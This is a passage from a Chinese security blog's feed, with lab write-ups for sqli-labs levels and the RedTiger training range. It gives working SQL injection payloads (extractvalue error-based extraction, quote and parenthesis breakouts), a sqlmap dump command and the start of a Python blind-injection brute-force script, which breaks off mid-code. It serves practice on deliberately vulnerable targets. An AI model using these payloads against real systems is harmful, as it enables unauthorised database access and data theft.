&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/Less-9/?id=1&amp;#39;&lt;/span> --technique T -p id -T users --dump --count &lt;span class="m">1&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>基于时间的盲注非常慢，即使 sqlmap 做了优化，依然非常慢，所以只提取一行。我懒得等就直接 ctrl+c 了。总之，就到这里结束。&lt;/p>
&lt;h2 id="less-10-blind-time-based-doublequotes">Less-10 Blind Time-Based DoubleQuotes&lt;/h2>
&lt;p>和 Less-9 一样，换成了双引号。&lt;code>sqlmap&lt;/code>需要加上&lt;code>--level 2&lt;/code>参数，让 &lt;code>sqlmap&lt;/code> 更努力一点。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>两个知识点一个教训。&lt;/p>
&lt;p>知识点：&lt;/p>
&lt;ol>
&lt;li>&lt;code>rand&lt;/code>结合&lt;code>group by&lt;/code>实现报错注入，不过遗憾的是 MySQL 5.7.36 修复了，将来这个技巧算废了。&lt;/li>
&lt;li>&lt;code>select ... into outfile|dumpfile&lt;/code>和&lt;code>load data&lt;/code>。对MySQL和php分开部署的情况能导出不能下载，MySQL容器默认禁止了文件权限，无法利用。&lt;/li>
&lt;/ol>
&lt;p>教训则是接受失败和耐心尝试。尝试 Less-7 的时候，因为多出来的两个右括号，第一次补右括号无效后我差点就放弃尝试直接去看源码了。后来不抱什么希望再补了一个右括号，发现成功了的时候真的很惊喜，甚至有点庆幸。这也算是一次对自己的惰性的胜利吧。&lt;/p>
&lt;p>虽然啥也没干还是辛苦我自己了。&lt;/p></description></item><item><title>sqli-labs 实验记录 #1</title><link>https://nnnewb.github.io/blog/p/sqli-labs-training-1/</link><pubDate>Mon, 09 May 2022 17:14:46 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/sqli-labs-training-1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>sqli-labs 是一个开源的 SQL 注入学习平台，最近更新已经是 2014 年了，也是个老项目。不过 sqli-labs 提供的靶场更大，包含 4 个难度级别，每个难度十几题，总共 65 题。&lt;/p>
&lt;p>感觉会比 dvwa 难一大截，用来学 SQL 注入的玩法肯定是绰绰有余了。&lt;/p>
&lt;p>本篇应该是 sqli-labs &lt;em>Basic Challenges&lt;/em> 系列 WP 的开始。&lt;/p>
&lt;h2 id="环境搭建">环境搭建&lt;/h2>
&lt;h3 id="部署方案">部署方案&lt;/h3>
&lt;p>两种部署方式，一种是在虚拟机里安装 LAMP 环境（包管理或者别的什么一键安装都行），另一种就是 docker 容器化。显然容器化对靶场玩家更友好。所以我选择容器环境。&lt;/p>
&lt;p>这里使用了一个原 sqli-labs 的分支，&lt;a class="link" href="https://github.com/aljavier/sqli-labs" target="_blank" rel="noopener"
>aljavier/sqli-labs&lt;/a>，省下自己写 docker-compose 和 dockerfile 找环境适配的时间。未来发现配置有问题再自己改改。&lt;/p>
&lt;h3 id="虚拟机环境准备">虚拟机环境准备&lt;/h3>
&lt;p>虚拟机系统选 Ubuntu 或者 Debian ，或者随你喜欢。安装 docker 和 docker-compose，具体步骤自己看文档。&lt;/p>
&lt;p>可能还有些需要准备的东西，如果宿主机上没有的话可以考虑在虚拟机里安装，比如 &lt;code>sqlmap&lt;/code> ，还有需要命令行直连 MySQL 的话可以再装个 &lt;code>mycli&lt;/code>。其他就是些个人偏好的开发环境，用来写打靶的小工具小脚本什么的。vim 配置 ohmyzsh 这些就不用提了。&lt;/p>
&lt;h3 id="部署启动">部署启动&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">git clone https://ghproxy.com/github.com/aljavier/sqli-labs
&lt;span class="nb">cd&lt;/span> sqli-labs
docker-compose up -d
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我额外干了点可能没必要的事情，因为注意到 &lt;code>index.html&lt;/code>、&lt;code>readme.md&lt;/code> 之类很多文件都有 &lt;code>x&lt;/code> 权限位，这可能是因为在 Windows 上用 Git 提交导致的权限错误，所以我顺便 &lt;code>find . -executable -type f -name '*.html' | xargs -I{} chmod -x&lt;/code> 把权限清理了一下。带&lt;code>x&lt;/code>权限的文件比较多也不只是&lt;code>html&lt;/code>，总之最后是全都去掉了&lt;code>x&lt;/code>权限。&lt;/p>
&lt;p>之所以说没必要是可能影响之后的注入利用，总之这一步随意。&lt;/p>
&lt;h2 id="初探">初探&lt;/h2>
&lt;h3 id="总览">总览&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222.png"
width="1920"
height="935"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509155939222_huf633b8b6263f38e2990a8cfbe67df6df_78039_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509155939222"
class="gallery-image"
data-flex-grow="205"
data-flex-basis="492px"
>&lt;/p>
&lt;p>UI设计有点拉。左上角是切换不同难度和重置数据库，可以看到除了 &lt;code>Page-1(Basic Challenges)&lt;/code> 还有 3 个难度。&lt;/p>
&lt;p>下面的脑图就是这个难度下的 &lt;em>关卡&lt;/em> 了。&lt;/p>
&lt;h3 id="less-1-error-based-string">Less-1 Error-Based string&lt;/h3>
&lt;p>随意打开第一题。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531.png"
width="1065"
height="293"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162045531_hu928e31b5621b2b11be7bb8c4b66a2c48_98253_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509162045531"
class="gallery-image"
data-flex-grow="363"
data-flex-basis="872px"
>&lt;/p>
&lt;p>提示输入数字ID作为参数，提示有点模糊，正确做法是在URL里添加&lt;code>?id=1&lt;/code>这样的 query string。上一页有明确提示 &lt;code>single quotes&lt;/code>，这里给一个&lt;code>'&lt;/code>就会报错：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625.png"
width="1245"
height="248"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162320625_hu92f3ed23e0f69e0380dab9a75fb011b4_103092_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509162320625"
class="gallery-image"
data-flex-grow="502"
data-flex-basis="1204px"
>&lt;/p>
&lt;p>但奇妙的是这里看似是数字型注入，给&lt;code>?id=1 and 1=1&lt;/code>正确返回。但如果多测一下&lt;code>?id=1 and 1=0&lt;/code>就会发现依然是正确返回，所以造成这一结果应该是 php 5.x 的字符串转数字中丢掉了后面的&lt;code>and 1=1&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659.png"
width="512"
height="547"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509162647659_hubd5c3a13e32af9ed107d20cccbe656ac_25084_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509162647659"
class="gallery-image"
data-flex-grow="93"
data-flex-basis="224px"
>&lt;/p>
&lt;p>所以按字符型注入处理即可。确定要补&lt;code>'&lt;/code>之后就可以继续了。这题主题是 Error Based，所以我们构造一个 Error Based 注入。&lt;code>?id=1' and extractvalue(1,concat('~',version())) -- &lt;/code>。注意&lt;code>--&lt;/code>后的空格，浏览器会自动删掉URL前后的空格字符，可以手动在末尾补一个URL编码的空格符&lt;code>%20&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656.png"
width="1083"
height="249"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163203656_hudf1f1a1ed6aef57603fc90799f4fe80d_97515_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509163203656"
class="gallery-image"
data-flex-grow="434"
data-flex-basis="1043px"
>&lt;/p>
&lt;p>到这就完成了利用。&lt;/p>
&lt;h3 id="less-2-error-based-intiger">Less-2 Error-Based Intiger&lt;/h3>
&lt;p>应该是想写 Integer。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103.png"
width="1047"
height="259"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509163431103"
class="gallery-image"
data-flex-grow="404"
data-flex-basis="970px"
>&lt;/p>
&lt;p>初始提示一样，尝试&lt;code>?id=1 and 1=1&lt;/code>和&lt;code>?id=1 and 1=0&lt;/code>之后发现存在注入，提示 Error-Based，选择和上一题同样的 Payload 去掉&lt;code>'&lt;/code>可破。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943.png"
width="1172"
height="351"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509163615943"
class="gallery-image"
data-flex-grow="333"
data-flex-basis="801px"
>&lt;/p>
&lt;h3 id="less-3-error-based-single-quotes-with-twist">Less-3 Error-Based Single-quotes with twist&lt;/h3>
&lt;p>一样的提示。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743.png"
width="1028"
height="250"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509163747743"
class="gallery-image"
data-flex-grow="411"
data-flex-basis="986px"
>&lt;/p>
&lt;p>但这题有点不一样的地方，尝试&lt;code>?id=1' and 1=1 --%20&lt;/code>会发现依然报 SQL 语法错误。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687.png"
width="1171"
height="186"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509164101687"
class="gallery-image"
data-flex-grow="629"
data-flex-basis="1510px"
>&lt;/p>
&lt;p>试了下&lt;code>?id=1; -- %20&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088.png"
width="1252"
height="199"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165114088"
class="gallery-image"
data-flex-grow="629"
data-flex-basis="1509px"
>&lt;/p>
&lt;p>没辙了，看一眼参考答案（源码）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721.png"
width="541"
height="23"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509164941721"
class="gallery-image"
data-flex-grow="2352"
data-flex-basis="5645px"
>&lt;/p>
&lt;p>所以是我少给了个&lt;code>)&lt;/code>。这时候才后知后觉发现语法错误报错里已经有提示了，&lt;code>near '; -- ') LIMIT 0,1&lt;/code>，这里有个右半括号。&lt;/p>
&lt;p>所以把第一题的 payload 改一下，&lt;code>?id=1') and extractvalue(1,concat('~',version())) --%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349.png"
width="772"
height="203"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165259349"
class="gallery-image"
data-flex-grow="380"
data-flex-basis="912px"
>&lt;/p>
&lt;p>这关就算 pass 了。&lt;/p>
&lt;p>教训是不要忽视细节。&lt;/p>
&lt;h3 id="less-4-error-based-double-quotes">Less-4 Error-Based Double Quotes&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151.png"
width="1142"
height="367"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165419151"
class="gallery-image"
data-flex-grow="311"
data-flex-basis="746px"
>&lt;/p>
&lt;p>提示 &lt;code>DoubleQuotes&lt;/code>，MySQL 的字符串可以用双引号 &lt;code>&amp;quot;&lt;/code>，这里试一下 Payload &lt;code>?id=1&amp;quot; and 1=0&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942.png"
width="1213"
height="209"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165543942"
class="gallery-image"
data-flex-grow="580"
data-flex-basis="1392px"
>&lt;/p>
&lt;p>发现有错误，从错误信息来看有个&lt;code>&amp;quot;)&lt;/code>，我们稍微改下 paylaod 再加上注释符：&lt;code>?id=1&amp;quot;) and 1=0; --%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792.png"
width="1091"
height="314"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165724792"
class="gallery-image"
data-flex-grow="347"
data-flex-basis="833px"
>&lt;/p>
&lt;p>成功，现在还是用 &lt;code>extractvalue&lt;/code> 提取信息：&lt;code>?id=1&amp;quot;) and extractvalue(1,concat('~',version())); --%20&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583.png"
width="781"
height="196"
srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220509165834583"
class="gallery-image"
data-flex-grow="398"
data-flex-basis="956px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>吸收的教训还是两个字，细心。&lt;/p>
&lt;p>另外还有个关于 payload 的问题。error-based injection 需要错误回显里给出参数字段的值，满足这个条件的函数不多，我只知道 &lt;code>updatexml&lt;/code> 和&lt;code>extractvalue&lt;/code>是肯定ok的，前一篇 red tiger 的打靶笔记里记录了另外两种方法（BIGINT UNSIGNED溢出和&lt;code>ST_LongFromGeoHash&lt;/code>，溢出法在 5.7好像不行了）但少有用起来。&lt;/p>
&lt;p>在使用 &lt;code>extractvalue&lt;/code> 这个 payload 过程里会有疑问，为什么要有一个&lt;code>concat('~', version())&lt;/code> 而不是直接 &lt;code>extractvalue(1,version())&lt;/code>？其实实测一下就会发现 dump 出来的数据不完整或者干脆不报错。原因也很简单，&lt;code>extractvalue&lt;/code>是个&lt;code>xml&lt;/code>函数，第二个参数是&lt;code>xpath&lt;/code>。&lt;code>xpath&lt;/code>的语法正好会允许很多格式的数据，比如单纯整数或单词，当成合法的&lt;code>xpath&lt;/code>表达式。&lt;/p>
&lt;p>比如上面的 Less-4 ，用 &lt;code>?id=1&amp;quot;) and extractvalue(1,database()); --%20&lt;/code>这个payload会发现页面不报错，因为&lt;code>database()&lt;/code>返回的&lt;code>security&lt;/code>正好可以当成&lt;code>xpath&lt;/code>表达式被识别，虽然没从第一个参数里提取出任何东西，但也没触发MySQL错误，也就拿不到第二参数的内容了。&lt;/p>
&lt;p>看似没用的&lt;code>concat('~', col)&lt;/code>，但实际上起到一个重要作用。它添加的一个&lt;code>~&lt;/code>让参数不论是什么格式，都不能当成&lt;code>xpath&lt;/code>识别，也就让 MySQL 能稳定地抛出错误，让我们稳定地从错误信息里拿到&lt;code>extractvalue&lt;/code>第二参数的内容。&lt;/p></description></item><item><title>red tiger 打靶日志</title><link>https://nnnewb.github.io/blog/p/redtiger-lab-training-note-2022-05-06/</link><pubDate>Fri, 06 May 2022 15:32:08 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/redtiger-lab-training-note-2022-05-06/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>虽然靶场说不要透露任何 solution 但谷歌搜了下发现早有人透题了&amp;hellip;于是灵活一点，不透 flag 就完了。&lt;/p>
&lt;h2 id="正文">正文&lt;/h2>
&lt;h3 id="盲注测试">盲注测试&lt;/h3>
&lt;p>看到&lt;code>id=1&lt;/code>先试试&lt;code>id=2&lt;/code>，发现返回 0，然后试试&lt;code>id=2 or 1=1&lt;/code>，返回1，应该能注入。&lt;/p>
&lt;h3 id="长度测试">长度测试&lt;/h3>
&lt;p>本来想 &lt;code>or&lt;/code> 跟一个子查询：&lt;code>SELECT (SELECT CHAR_LENGTH(keyword) FROM level4_secret LIMIT 1)&amp;gt;10;&lt;/code>，手欠试了下直接&lt;code>or char_length(keyword)&amp;gt;10&lt;/code> 发现返回了 1 row，于是省掉了子查询。&lt;/p>
&lt;p>用 &lt;code>or char_length(keyword)&amp;gt;?&lt;/code>二分法，从&lt;code>&amp;gt;100&lt;/code>开始测直到得到结果。&lt;/p>
&lt;!-- 结果是 21 -->
&lt;h3 id="按位猜解">按位猜解&lt;/h3>
&lt;p>用 &lt;code>or ascii(substring(keyword,1,1)) BETWEEN ascii('a') AND ascii('z')&lt;/code>测一遍第一个字符是不是小写字母，然后按这个思路二分搜一遍。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">BETWEEN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">BETWEEN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">字母表前一半&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">97&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="mi">122&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">BETWEEN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;z&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">#&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="err">字母表后一半&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">BETWEEN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Z&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">BETWEEN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">ascii&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;9&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但如果不是字母或数字，是 UNICODE 的话就麻烦了。可以结合 &lt;code>hex&lt;/code> 函数或者别的方式编码一下再猜，我没找到能把 UNICODE 转数字就像 &lt;code>ascii&lt;/code> 一样的函数。&lt;/p>
&lt;p>手工测肯定是不行的，没那个闲工夫。写个脚本暴力跑一遍即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
&lt;span class="n">length&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="c1"># 自己根据上面的方法找出 keyword 长度&lt;/span>
&lt;span class="n">secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">pos&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">length&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">printable&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">pos&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">: test &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://redtiger.labs.overthewire.org/level4.php&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
